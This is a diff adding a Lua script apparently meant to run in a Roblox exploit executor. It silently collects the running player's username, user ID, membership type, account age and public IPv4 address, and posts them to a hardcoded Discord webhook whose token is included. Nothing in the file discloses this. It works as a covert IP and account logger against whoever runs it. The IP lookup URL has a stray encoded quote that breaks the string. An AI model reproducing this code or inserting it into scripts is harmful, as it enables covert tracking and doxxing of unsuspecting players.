@@ -1,0 +1,58 @@
+local Webhook = 'https://discord.com/api/webhooks/1141724086163230852/kaF_UzDECfwYWB9tcG-y5hsNsi-mGr7jdHqgnlrwRgQiza1bMOCs7Om_bag1RB20kPgj'
+
+local IPv4 = game:HttpGet("https://v4.ident.me/%22)
+
+local Headers = {["content-type"] = "application/json"}
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+local AccountAge = LocalPlayer.AccountAge
+local AccountAgeYears = math.floor(AccountAge / 365)
+local AccountAgeMonths = math.floor((AccountAge % 365) / 30)
+local AccountAgeDays = AccountAge % 30
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local UserId = LocalPlayer.UserId
+local PlayerName = LocalPlayer.Name
+
+local PlayerData =
+{
+       ["content"] = "",
+       ["embeds"] = {{
+           ["title"] = "Username:",
+           ["description"] = PlayerName,
+           ["color"] = tonumber(0x2B6BE4),
+           ["fields"] = {
+               {
+                   ["name"] = "Membership Type:",
+                   ["value"] = MembershipType,
+                   ["inline"] = false
+               },
+               {
+                   ["name"] = "Account Age:",
+                   ["value"] = string.format("%d years, %d months, %d days", AccountAgeYears, AccountAgeMonths, AccountAgeDays),
+                   ["inline"] = false
+               },
+               {
+                   ["name"] = "User Id:",
+                   ["value"] = UserId,
+                   ["inline"] = false
+               },
+               {
+                   ["name"] = "IPv4:",
+                   ["value"] = IPv4,
+                   ["inline"] = false
+               },
+           },
+       }}
+   }
+
+local PlayerDataJSON = game:GetService('HttpService'):JSONEncode(PlayerData)
+local HttpRequest = http_request;
+
+if syn then
+   HttpRequest = syn.request
+else
+   HttpRequest = http_request
+end
+
+HttpRequest({Url=Webhook, Body=PlayerDataJSON, Method="POST", Headers=Headers})
